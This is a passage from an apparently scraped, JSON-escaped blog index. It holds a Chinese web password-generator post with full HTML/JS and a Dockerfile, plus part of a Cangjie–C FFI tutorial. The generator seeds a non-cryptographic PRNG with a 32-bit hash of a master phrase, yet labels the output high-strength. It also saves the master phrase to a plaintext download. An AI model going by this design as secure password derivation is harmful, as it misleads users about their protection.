字符）\n支持排除特定字符\n生成的密码自动确保包含大小写字母、数字和特殊符号\n一键复制生成的密码\n下载密码信息到本地文件（包含记忆密码、区分代号和生成时间）\n实时显示密码长度和强度\nCode \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;密码生成器\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.tailwindcss.com\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link href=\u0026#34;https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;!-- Tailwind 配置 --\u0026gt; \u0026lt;script\u0026gt; tailwind.config = { theme: { extend: { colors: { primary: \u0026#34;#3B82F6\u0026#34;, secondary: \u0026#34;#10B981\u0026#34;, dark: \u0026#34;#1E293B\u0026#34;, light: \u0026#34;#F8FAFC\u0026#34;, }, fontFamily: { sans: [\u0026#34;Inter\u0026#34;, \u0026#34;system-ui\u0026#34;, \u0026#34;sans-serif\u0026#34;], }, }, }, }; \u0026lt;/script\u0026gt; \u0026lt;style type=\u0026#34;text/tailwindcss\u0026#34;\u0026gt; @layer utilities { .content-auto { content-visibility: auto; } .text-shadow { text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); } .transition-custom { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); } } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;bg-gradient-to-br from-gray-50 to-gray-100 min-h-screen font-sans text-dark\u0026#34; \u0026gt; \u0026lt;div class=\u0026#34;container mx-auto px-4 py-8 max-w-4xl\u0026#34;\u0026gt; \u0026lt;!-- 页面标题 --\u0026gt; \u0026lt;header class=\u0026#34;text-center mb-10\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-[clamp(2rem,5vw,3rem)] font-bold text-primary mb-3 text-shadow\u0026#34; \u0026gt; 密码生成器 \u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;text-gray-600 max-w-2xl mx-auto\u0026#34;\u0026gt; 安全、便捷地生成复杂密码，同时保持易记性 \u0026lt;/p\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;!-- 主内容区 --\u0026gt; \u0026lt;main class=\u0026#34;bg-white rounded-2xl shadow-xl p-6 md:p-8 mb-8 transform hover:shadow-2xl transition-custom\u0026#34; \u0026gt; \u0026lt;!-- 输入区域 --\u0026gt; \u0026lt;div class=\u0026#34;space-y-6 mb-8\u0026#34;\u0026gt; \u0026lt;!-- 记忆密码输入 --\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;memory-password\u0026#34; class=\u0026#34;block text-sm font-medium text-gray-700 mb-1\u0026#34; \u0026gt;记忆密码 \u0026lt;span class=\u0026#34;text-red-500\u0026#34;\u0026gt;*\u0026lt;/span\u0026gt;\u0026lt;/label \u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;memory-password\u0026#34; placeholder=\u0026#34;输入一个你能完全记住的短密码\u0026#34; value=\u0026#34;Aa123123\u0026#34; class=\u0026#34;w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-primary focus:border-primary transition-custom outline-none\u0026#34; required /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 区分代号输入 --\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;distinguisher\u0026#34; class=\u0026#34;block text-sm font-medium text-gray-700 mb-1\u0026#34; \u0026gt;区分代号 \u0026lt;span class=\u0026#34;text-red-500\u0026#34;\u0026gt;*\u0026lt;/span\u0026gt;\u0026lt;/label \u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;distinguisher\u0026#34; placeholder=\u0026#34;用于区别不同用途的简短代号（如gg,bd,wx）\u0026#34; value=\u0026#34;gg\u0026#34; class=\u0026#34;w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-primary focus:border-primary transition-custom outline-none\u0026#34; required /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 密码长度设置 --\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;password-length\u0026#34; class=\u0026#34;block text-sm font-medium text-gray-700 mb-1\u0026#34; \u0026gt;密码长度\u0026lt;/label \u0026gt; \u0026lt;div class=\u0026#34;flex items-center\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;range\u0026#34; id=\u0026#34;password-length\u0026#34; min=\u0026#34;8\u0026#34; max=\u0026#34;32\u0026#34; value=\u0026#34;10\u0026#34; class=\u0026#34;w-full h-2 bg-gray-200 rounded-lg appearance-none cursor-pointer accent-primary\u0026#34; /\u0026gt; \u0026lt;span id=\u0026#34;length-value\u0026#34; class=\u0026#34;ml-4 min-w-[3rem] text-center font-medium text-primary\u0026#34; \u0026gt;10\u0026lt;/span \u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 排除字符设置 --\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;exclude-chars\u0026#34; class=\u0026#34;block text-sm font-medium text-gray-700 mb-1\u0026#34; \u0026gt;排除字符\u0026lt;/label \u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;exclude-chars\u0026#34; placeholder=\u0026#34;输入需要排除的字符（如@#$）\u0026#34; value=\u0026#34;@\u0026#34; class=\u0026#34;w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-primary focus:border-primary transition-custom outline-none\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 生成按钮 --\u0026gt; \u0026lt;div class=\u0026#34;text-center mb-8\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;generate-btn\u0026#34; class=\u0026#34;bg-primary hover:bg-primary/90 text-white font-semibold py-3 px-8 rounded-lg shadow-lg hover:shadow-xl transform hover:-translate-y-1 transition-custom flex items-center justify-center mx-auto\u0026#34; \u0026gt; \u0026lt;i class=\u0026#34;fa fa-key mr-2\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; 生成密码 \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 结果区域 --\u0026gt; \u0026lt;div id=\u0026#34;result-container\u0026#34; class=\u0026#34;border border-gray-200 rounded-xl p-5 bg-gray-50 hidden\u0026#34; \u0026gt; \u0026lt;h2 class=\u0026#34;text-lg font-semibold text-gray-700 mb-3\u0026#34;\u0026gt;生成结果\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col md:flex-row md:items-center justify-between gap-4 mb-4\u0026#34; \u0026gt; \u0026lt;div class=\u0026#34;relative flex-1\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;generated-password\u0026#34; value=\u0026#34;F221c*4a4b\u0026#34; readonly class=\u0026#34;w-full px-4 py-3 bg-white rounded-lg border border-gray-300 font-mono text-gray-800 cursor-text\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;flex gap-2\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;copy-btn\u0026#34; class=\u0026#34;bg-secondary hover:bg-secondary/90 text-white font-medium py-2 px-4 rounded-lg shadow hover:shadow-md transform hover:-translate-y-0.5 transition-custom flex items-center\u0026#34; \u0026gt; \u0026lt;i class=\u0026#34;fa fa-copy mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; 复制 \u0026lt;/button\u0026gt; \u0026lt;button id=\u0026#34;download-btn\u0026#34; class=\u0026#34;bg-gray-700 hover:bg-gray-800 text-white font-medium py-2 px-4 rounded-lg shadow hover:shadow-md transform hover:-translate-y-0.5 transition-custom flex items-center\u0026#34; \u0026gt; \u0026lt;i class=\u0026#34;fa fa-download mr-1\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; 下载 \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 密码强度指示 --\u0026gt; \u0026lt;div class=\u0026#34;mt-4\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex justify-between text-sm mb-1\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;text-gray-600\u0026#34;\u0026gt;密码强度\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;strength-text\u0026#34; class=\u0026#34;font-medium text-green-600\u0026#34; \u0026gt;强\u0026lt;/span \u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;w-full bg-gray-200 rounded-full h-2.5\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;strength-meter\u0026#34; class=\u0026#34;bg-green-600 h-2.5 rounded-full\u0026#34; style=\u0026#34;width: 90%\u0026#34; \u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;!-- 说明区域 --\u0026gt; \u0026lt;section class=\u0026#34;bg-white/80 backdrop-blur-sm rounded-xl shadow-lg p-6 mb-8\u0026#34; \u0026gt; \u0026lt;h2 class=\u0026#34;text-xl font-semibold text-gray-800 mb-3\u0026#34;\u0026gt;使用说明\u0026lt;/h2\u0026gt; \u0026lt;ul class=\u0026#34;space-y-2 text-gray-600\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;flex items-start\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa fa-info-circle text-primary mt-1 mr-2\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span \u0026gt;记忆密码：选择一个你能完全记住的短密码，作为生成复杂密码的基础\u0026lt;/span \u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;flex items-start\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa fa-info-circle text-primary mt-1 mr-2\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span \u0026gt;区分代号：用于区别不同用途的密码，如谷歌账号可用\u0026#34;google\u0026#34;或\u0026#34;gg\u0026#34;\u0026lt;/span \u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;flex items-start\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa fa-info-circle text-primary mt-1 mr-2\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span \u0026gt;生成的密码会结合记忆密码和区分代号，经过算法处理后生成高强度密码\u0026lt;/span \u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;flex items-start\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fa fa-info-circle text-primary mt-1 mr-2\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span\u0026gt;所有操作均在本地完成，不会上传任何信息，确保密码安全\u0026lt;/span\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- 页脚 --\u0026gt; \u0026lt;footer class=\u0026#34;text-center text-gray-500 text-sm py-4\u0026#34;\u0026gt; \u0026lt;p\u0026gt;密码生成器 \u0026amp;copy; 2025 - 保护您的在线安全\u0026lt;/p\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 通知提示 --\u0026gt; \u0026lt;div id=\u0026#34;notification\u0026#34; class=\u0026#34;fixed bottom-5 right-5 bg-dark text-white px-4 py-3 rounded-lg shadow-lg transform translate-y-20 opacity-0 transition-custom flex items-center\u0026#34; \u0026gt; \u0026lt;i id=\u0026#34;notification-icon\u0026#34; class=\u0026#34;fa fa-check-circle mr-2 text-green-400\u0026#34; \u0026gt;\u0026lt;/i\u0026gt; \u0026lt;span id=\u0026#34;notification-text\u0026#34;\u0026gt;操作成功\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; // DOM元素 const memoryPasswordInput = document.getElementById(\u0026#34;memory-password\u0026#34;); const distinguisherInput = document.getElementById(\u0026#34;distinguisher\u0026#34;); const passwordLengthInput = document.getElementById(\u0026#34;password-length\u0026#34;); const lengthValueSpan = document.getElementById(\u0026#34;length-value\u0026#34;); const excludeCharsInput = document.getElementById(\u0026#34;exclude-chars\u0026#34;); const generateBtn = document.getElementById(\u0026#34;generate-btn\u0026#34;); const generatedPasswordInput = document.getElementById(\u0026#34;generated-password\u0026#34;); const copyBtn = document.getElementById(\u0026#34;copy-btn\u0026#34;); const downloadBtn = document.getElementById(\u0026#34;download-btn\u0026#34;); const resultContainer = document.getElementById(\u0026#34;result-container\u0026#34;); const notification = document.getElementById(\u0026#34;notification\u0026#34;); const notificationIcon = document.getElementById(\u0026#34;notification-icon\u0026#34;); const notificationText = document.getElementById(\u0026#34;notification-text\u0026#34;); const strengthMeter = document.getElementById(\u0026#34;strength-meter\u0026#34;); const strengthText = document.getElementById(\u0026#34;strength-text\u0026#34;); // 字符集定义 const uppercaseLetters = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; const lowercaseLetters = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34;; const numbers = \u0026#34;0123456789\u0026#34;; const symbols = \u0026#34;!@#$%^\u0026amp;*()_+~`|}{[]:;?\u0026gt;\u0026lt;,./-=\u0026#34;; // 初始化显示结果区域 resultContainer.classList.remove(\u0026#34;hidden\u0026#34;); // 更新密码长度显示 passwordLengthInput.addEventListener(\u0026#34;input\u0026#34;, () =\u0026gt; { lengthValueSpan.textContent = passwordLengthInput.value; }); // 生成密码 generateBtn.addEventListener(\u0026#34;click\u0026#34;, () =\u0026gt; { const memoryPassword = memoryPasswordInput.value.trim(); const distinguisher = distinguisherInput.value.trim(); const length = parseInt(passwordLengthInput.value); const excludeChars = excludeCharsInput.value.trim(); // 验证输入 if (!memoryPassword || !distinguisher) { showNotification(\u0026#34;请输入记忆密码和区分代号\u0026#34;, \u0026#34;error\u0026#34;); return; } // 生成密码 const password = generatePassword( memoryPassword, distinguisher, length, excludeChars ); generatedPasswordInput.value = password; // 显示结果区域 resultContainer.classList.remove(\u0026#34;hidden\u0026#34;); // 更新密码强度 updatePasswordStrength(password); // 添加生成动画 generatedPasswordInput.classList.add(\u0026#34;animate-pulse\u0026#34;); setTimeout(() =\u0026gt; { generatedPasswordInput.classList.remove(\u0026#34;animate-pulse\u0026#34;); }, 1000); showNotification(\u0026#34;密码生成成功\u0026#34;, \u0026#34;success\u0026#34;); }); // 复制密码 copyBtn.addEventListener(\u0026#34;click\u0026#34;, () =\u0026gt; { const password = generatedPasswordInput.value; navigator.clipboard .writeText(password) .then(() =\u0026gt; { showNotification(\u0026#34;密码已复制到剪贴板\u0026#34;, \u0026#34;success\u0026#34;); }) .catch((err) =\u0026gt; { showNotification(\u0026#34;复制失败，请手动复制\u0026#34;, \u0026#34;error\u0026#34;); console.error(\u0026#34;复制失败:\u0026#34;, err); }); }); // 下载密码 downloadBtn.addEventListener(\u0026#34;click\u0026#34;, () =\u0026gt; { const password = generatedPasswordInput.value; const memoryPassword = memoryPasswordInput.value.trim(); const distinguisher = distinguisherInput.value.trim(); // 创建文件内容 const content = `密码信息:\\n` + `记忆密码: ${memoryPassword}\\n` + `区分代号: ${distinguisher}\\n` + `生成密码: ${password}\\n` + `生成时间: ${new Date().toLocaleString()}`; // 创建Blob对象 const blob = new Blob([content], { type: \u0026#34;text/plain\u0026#34; }); const url = URL.createObjectURL(blob); // 创建下载链接 const a = document.createElement(\u0026#34;a\u0026#34;); a.href = url; a.download = `password_${distinguisher}_${new Date().getTime()}.txt`; document.body.appendChild(a); a.click(); // 清理 document.body.removeChild(a); URL.revokeObjectURL(url); showNotification(\u0026#34;密码已下载\u0026#34;, \u0026#34;success\u0026#34;); }); // 密码生成算法 function generatePassword( memoryPassword, distinguisher, length, excludeChars ) { // 结合记忆密码和区分代号作为基础 const base = memoryPassword + distinguisher; // 创建哈希值作为种子 let hash = 0; for (let i = 0; i \u0026lt; base.length; i++) { const char = base.charCodeAt(i); hash = (hash \u0026lt;\u0026lt; 5) - hash + char; hash = hash \u0026amp; hash; // 转换为32位整数 } // 创建随机数生成器（使用哈希作为种子） function mulberry32(seed) { return function () { seed += 0x6d2b79f5; let t = seed; t = Math.imul(t ^ (t \u0026gt;\u0026gt;\u0026gt; 15), t | 1); t ^= t + Math.imul(t ^ (t \u0026gt;\u0026gt;\u0026gt; 7), t | 61); return ((t ^ (t \u0026gt;\u0026gt;\u0026gt; 14)) \u0026gt;\u0026gt;\u0026gt; 0) / 4294967296; }; } const rng = mulberry32(hash); // 构建可用字符集（排除指定字符） let allChars = uppercaseLetters + lowercaseLetters + numbers + symbols; if (excludeChars) { allChars = allChars .split(\u0026#34;\u0026#34;) .filter((char) =\u0026gt; !excludeChars.includes(char)) .join(\u0026#34;\u0026#34;); } // 如果所有字符都被排除了，使用默认字符集 if (allChars.length === 0) { allChars = uppercaseLetters + lowercaseLetters + numbers + symbols; } // 生成密码 let password = \u0026#34;\u0026#34;; for (let i = 0; i \u0026lt; length; i++) { const randomIndex = Math.floor(rng() * allChars.length); password += allChars[randomIndex]; } // 确保密码包含足够的复杂性 return ensurePasswordComplexity(password, allChars, rng); } // 确保密码复杂度 function ensurePasswordComplexity(password, allChars, rng) { const hasUpper = /[A-Z]/.test(password); const hasLower = /[a-z]/.test(password); const hasNumber = /\\d/.test(password); const hasSymbol = /[^A-Za-z0-9]/.test(password); // 如果密码缺少某种类型的字符，替换一个字符 if (!hasUpper) { password = replaceRandomChar(password, uppercaseLetters, rng); } if (!hasLower) { password = replaceRandomChar(password, lowercaseLetters, rng); } if (!hasNumber) { password = replaceRandomChar(password, numbers, rng); } if (!hasSymbol) { password = replaceRandomChar(password, symbols, rng); } return password; } // 替换密码中的随机字符 function replaceRandomChar(password, charSet, rng) { const chars = password.split(\u0026#34;\u0026#34;); const randomIndex = Math.floor(rng() * chars.length); const newChar = charSet[Math.floor(rng() * charSet.length)]; chars[randomIndex] = newChar; return chars.join(\u0026#34;\u0026#34;); } // 更新密码强度显示 function updatePasswordStrength(password) { let strength = 0; // 基于长度的强度 if (password.length \u0026gt;= 8) strength += 25; if (password.length \u0026gt;= 12) strength += 10; if (password.length \u0026gt;= 16) strength += 10; // 基于复杂性的强度 if (/[A-Z]/.test(password)) strength += 15; if (/[a-z]/.test(password)) strength += 15; if (/[0-9]/.test(password)) strength += 15; if (/[^A-Za-z0-9]/.test(password)) strength += 10; // 限制最大值为100 strength = Math.min(strength, 100); // 更新UI strengthMeter.style.width = `${strength}%`; // 设置颜色和文本 if (strength \u0026lt; 30) { strengthMeter.className = \u0026#34;bg-red-500 h-2.5 rounded-full\u0026#34;; strengthText.textContent = \u0026#34;弱\u0026#34;; strengthText.className = \u0026#34;font-medium text-red-500\u0026#34;; } else if (strength \u0026lt; 70) { strengthMeter.className = \u0026#34;bg-yellow-500 h-2.5 rounded-full\u0026#34;; strengthText.textContent = \u0026#34;中\u0026#34;; strengthText.className = \u0026#34;font-medium text-yellow-600\u0026#34;; } else { strengthMeter.className = \u0026#34;bg-green-600 h-2.5 rounded-full\u0026#34;; strengthText.textContent = \u0026#34;强\u0026#34;; strengthText.className = \u0026#34;font-medium text-green-600\u0026#34;; } } // 显示通知 function showNotification(message, type = \u0026#34;success\u0026#34;) { notificationText.textContent = message; if (type === \u0026#34;success\u0026#34;) { notificationIcon.className = \u0026#34;fa fa-check-circle mr-2 text-green-400\u0026#34;; } else { notificationIcon.className = \u0026#34;fa fa-exclamation-circle mr-2 text-red-400\u0026#34;; } // 显示通知 notification.classList.remove(\u0026#34;translate-y-20\u0026#34;, \u0026#34;opacity-0\u0026#34;); notification.classList.add(\u0026#34;translate-y-0\u0026#34;, \u0026#34;opacity-100\u0026#34;); // 3秒后隐藏 setTimeout(() =\u0026gt; { notification.classList.remove(\u0026#34;translate-y-0\u0026#34;, \u0026#34;opacity-100\u0026#34;); notification.classList.add(\u0026#34;translate-y-20\u0026#34;, \u0026#34;opacity-0\u0026#34;); }, 3000); } // 初始化密码强度 updatePasswordStrength(generatedPasswordInput.value); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Dockerfile # 使用nginx作为基础镜像 FROM nginx:alpine # 将生成的index.html复制到nginx的默认网站目录 COPY index.html /usr/share/nginx/html/ # 暴露80端口 EXPOSE 80 # 启动nginx服务 CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon off;\u0026#34;] Next 是否需要后端/login/base64\n","permalink":"https://qfsyso.github.io/posts/password-generator/","summary":"Func 基于记忆密码和区分代号生成复杂密码\n支持设置密码长度（8-32 字符）\n支持排除特定字符\n生成的密码自动确保包含大小写字母、数字和特殊符号\n一键复制生成的密码\n下载密码信息到本地文件（包含记忆密码、区分代号和生成时间）\n实时显示密码长度和强度\nCode \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;密码生成器\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.tailwindcss.com\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link href=\u0026#34;https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; /\u0026gt; \u0026lt;!-- Tailwind 配置 --\u0026gt; \u0026lt;script\u0026gt; tailwind.config = { theme: { extend: { colors: { primary: \u0026#34;#3B82F6\u0026#34;, secondary: \u0026#34;#10B981\u0026#34;, dark: \u0026#34;#1E293B\u0026#34;, light: \u0026#34;#F8FAFC\u0026#34;, }, fontFamily: { sans: [\u0026#34;Inter\u0026#34;, \u0026#34;system-ui\u0026#34;, \u0026#34;sans-serif\u0026#34;], }, }, }, }; \u0026lt;/script\u0026gt; \u0026lt;style type=\u0026#34;text/tailwindcss\u0026#34;\u0026gt; @layer utilities { .content-auto { content-visibility: auto; } .","title":"Password Generator"},{"content":"仓颉-C跨语言编程 仓颉编程语言作为一款面向全场景应用开发的现代编程语言，通过现代语言特性的集成、全方位的编译优化和运行时实现、以及开箱即用的 IDE 工具链支持，为开发者打造友好开发体验和卓越程序性能。C语言是一种较早的程序设计语言，广泛应用于底层开发。C语言能以简易的方式编译、处理低级存储器。\n仓颉-C跨语言互操作介绍 仓颉为了兼容已有的生态，支持调用 C 语言的函数，也支持 C 语言调用仓颉的函数。\n仓颉支持通过FFI（Foreign Function Interface）直接调用C语言函数。其核心机制包括：\n类型兼容性：仓颉的Int32、Float64等基础类型与C语言的int、double等一一对应； 动态库绑定：将C代码编译为共享库（如.so或.dll），并通过@C和foreign声明函数； 安全性：仓颉通过类型检查确保调用参数与返回值的正确性，避免内存错误。 举个例子，假设要调用 C 的 rand 和 printf 函数，它的函数签名如下：\n// stdlib.h int rand(); // stdio.h int printf (const char *fmt, ...); 那么在仓颉中调用这两个函数的方式如下： // 通过`foreign`关键字声明函数，省略`@C` foreign func rand(): Int32 foreign func printf(fmt: CString, ...): Int32 main() { // 通过`unsafe`块调用C函数 let r = unsafe { rand() } println(\u0026#34;random number ${r}\u0026#34;) unsafe { var fmt = LibC.mallocCString(\u0026#34;Hello, No.%d\\n\u0026#34;) printf(fmt, 1) LibC.free(fmt) } } 注意： foreign 修饰函数声明，代表该函数为外部函数。被 foreign 修饰的函数只能有函数声明，不能有函数实现。 foreign 声明的函数，参数和返回类型必须符合 C 和仓颉数据类型之间的映射关系。 由于 C 侧函数很可能产生不安全操作，所以调用 foreign 修饰的函数需要被 unsafe 块包裹，否则会发生编译错误。 @C 修饰的 foreign 关键字只能用来修饰函数声明，不可用来修饰其他声明，否则会发生编译错误。 @C 只支持修饰 foreign 函数、top-level 作用域中的非泛型函数和 struct 类型。 foreign 函数不支持命名参数和参数默认值。foreign 函数允许变长参数，使用 … 表达，只能用于参数列表的最后。变长参数均需要满足 CType 约束，但不必是同一类型。 仓颉（CJNative 后端）虽然提供了栈扩容能力，但是由于 C 侧函数实际使用栈大小仓颉无法感知，所以 ffi 调用进入 C 函数后，仍然存在栈溢出的风险（可能导致程序运行时崩溃或者产生不可预期的行为），需要开发者根据实际情况，修改 cjStackSize 的配置。 仓颉与C语言基本数据类型映射关系：\n数据类型对应表 Cangjie Type C Type Size(byte) Unit void 0 Bool bool 1 UInt8 char 1 Int8 int8 1 UInt8 uint8 1 Int16 int16 2 UInt16 uint16 2 Int32 int32 4 UInt32 uint32 4 Int64 int64 8 UInt64 uint64 8 IntNative ssize platform dependent UIntNative ize platform dependent Float32 float 4 Float64 double 8 表格展示了仓颉常用基础数据类型对应的C语言中的数据类型和字节数。int 类型、long类型等由于其在不同平台上的不确定性，需要程序员自行指定对应仓颉编程语言类型。 仓颉-C跨语言编程体验 可以简单将仓颉调用C函数分为两类，一类是调用C语言标准库。另一类是调用C语言自定义库函数。\n仓颉调C语言标准库函数 C语言标准库程序运行时由动态链接器自动加载，可以在仓颉中直接使用foreign声明标准库函数，然后直接调用。\nCodeArts IDE for Cangjie 点击新建工程创建仓颉工程，名称定义为demo，产物类型选择executable。\n产物类型说明：\nexecutable，可执行文件； static，静态库，是一组预先编译好的目标文件的集合； dynamic，动态库，是一种在程序运行时才被加载到内存中的库文件，多个程序共享一个动态库副本，而不是像静态库那样每个程序都包含一份完整的副本。\n创建项目后，打开src目录下main.cj文件，替换成以下测试代码（仓颉调用C标准库的rand()函数生成一个随机数，并通过printf()函数输出格式化的字符串）。\npackage demo import std.io.* import std.time.* // 声明 C 的 rand() 和 srand() 函数 foreign func rand(): Int32 foreign func srand(seed: Int64): Unit // 声明C的printf()函数，接受CString作为第一个参数，后续参数为可变参数列表 foreign func printf(fmt: CString, ...): Int32 main() { // 使用当前时间纳秒作为随机数种子 unsafe { srand(DateTime.nowUTC().nanosecond) } // 调用C的rand()函数生成随机数，并将其转换为0到99之间的值 let randomNumber = unsafe { rand() } % 100 // 使用C的printf()函数打印随机数 unsafe { // 准备要打印的字符串，使用LibC.mallocCString分配C字符串 var fmt = LibC.mallocCString(\u0026#34;生成的随机数是：%d\\n\u0026#34;) printf(fmt, randomNumber) LibC.free(fmt) // 释放分配的C字符串 } } 点击右上角运行按钮直接运行main.cj，在控制台打印仓颉调用C函数生成的随机数。\n仓颉调C语言自定义库函数 C语言自定义库函数需显式链接（如编译时加-L./ -lxxx）或运行时动态加载（dlopen/dlsym）。下面我们结合示例进行体验。\n打开华为开发者空间云主机中的CodeArts IDE for Cangjie编译器，任意窗口下使用快捷键ALT+P新建仓颉工程，名称定义为demo1，产物类型选择executable。\n在src目录下创建一个test.c文件，将下面示例代码内容复制到 test.c。\nC 代码中分别提供两个函数：\ngetCString 函数，用于返回一个 C 侧的字符串指针； printCString 函数，用于打印来自仓颉侧 CString 。\n#include \u0026lt;stdio.h\u0026gt; char *str = \u0026#34;CString in C code.\u0026#34;; char *getCString() { return str; } void printCString(char *s) { printf(\u0026#34;%s\\n\u0026#34;, s); } 将以下仓颉示例代码复制到src目录下的main.cj文件中，在此仓颉代码中，创建一个 CString 对象，传递给 C 侧打印。并且获取 C 侧字符串，在仓颉侧打印。\npackage demo1 foreign func getCString(): CString foreign func printCString(s: CString): Unit main() { // 仓颉侧构造 CString 实例，传递到 C 侧 unsafe { let s: CString = LibC.mallocCString(\u0026#34;CString in Cangjie code.\u0026#34;) printCString(s) LibC.free(s) } unsafe { // C 侧申请字符串指针，传递到仓颉侧成为 CString 实例，再转换为仓颉字符串 String 类型 let cs = getCString() println(cs.toString()) } // 在 try-with-resource 语法上下文中使用 CStringResource 自动管理 CString 内存 let cs = unsafe { LibC.mallocCString(\u0026#34;CString in Cangjie code.\u0026#34;) } try (csr = cs.asResource()) { unsafe { printCString(csr.value) } } } 右键src目录，选择在集成终端中打开进入终端窗口。\n然后执行以下gcc命令将C 代码编译成动态库，得到C 库 libtest.so。\ngcc -fPIC -shared test.c -o libtest.so 参数说明：\n-fPIC：生成位置无关代码； -shared：生成动态链接库； test.c：输入源文件； -o libtest.so：指定输出文件名为动态库libtest.so。 执行cjc命令，编译出可执行文件main。\ncjc -L . -l test main.cj 参数说明：\n-L .：指定动态库搜索路径为当前目录src； -l test：指定链接的动态库libtest.so； main.cj：需编译的仓颉源代码文件。 执行main文件。\n./main 可以看到已成功调用了C语言中的getString和printCString函数。\n实现一个猜拳小游戏 接下来我们通过一个猜拳小游戏开发来练习仓颉-C跨语言编程。通过C语言生成随机选择，仓颉语言处理用户输入和胜负判定。\n打开华为开发者空间云主机中的CodeArts IDE for Cangjie编译器，任意窗口下使用快捷键ALT+P新建仓颉工程，名称定义为demo3，产物类型选择executable。\n在src目录下创建一个game.c文件，将下面示例代码内容复制到 game.c。\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; // 生成电脑的随机选择（0=石头，1=剪刀，2=布） int get_computer_choice() { static int initialized = 0; if (!initialized) { srand(time(NULL)); // 